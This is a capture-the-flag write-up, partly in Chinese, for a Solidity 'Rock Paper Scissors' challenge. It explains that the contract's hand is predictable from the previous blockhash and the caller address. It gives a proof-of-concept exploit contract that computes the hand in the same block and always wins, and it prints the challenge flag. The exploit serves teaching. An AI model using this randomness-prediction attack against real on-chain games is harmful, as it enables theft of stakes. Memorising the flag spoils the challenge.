## Rock Paper Scissors

Tony found out average salary of smart contract developers could reach millions of dollars. He started to learn about Solidity and deployed his first ever smart contract of epic rock scissor paper game!

本题要求和 `RockPaperScissors` 合约玩石头剪刀布，并击败对方。我们在同一个区块中提前知道结果并根据结果输入必赢的手势即可。

POC:
``` solidity
contract RockPaperScissorsExploit {
    RockPaperScissors public rps;
    Challenge public chal;

    constructor(address _chal) {
        chal = Challenge(_chal);
        rps = chal.rps();
    }

    function randomShape() internal view returns (RockPaperScissors.Hand) {
        return RockPaperScissors.Hand(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number - 1)))) % 3);
    }

    function solve() public {
        RockPaperScissors.Hand mine = randomShape();
        if (mine == RockPaperScissors.Hand.Scissors) {
            rps.tryToBeatMe(RockPaperScissors.Hand.Rock);
        } else if (mine == RockPaperScissors.Hand.Rock) {
            rps.tryToBeatMe(RockPaperScissors.Hand.Paper);
        } else if (mine == RockPaperScissors.Hand.Paper) {
            rps.tryToBeatMe(RockPaperScissors.Hand.Scissors);
        }
    }
}
```
Flag: blaz{r3t_t0_rsp!}
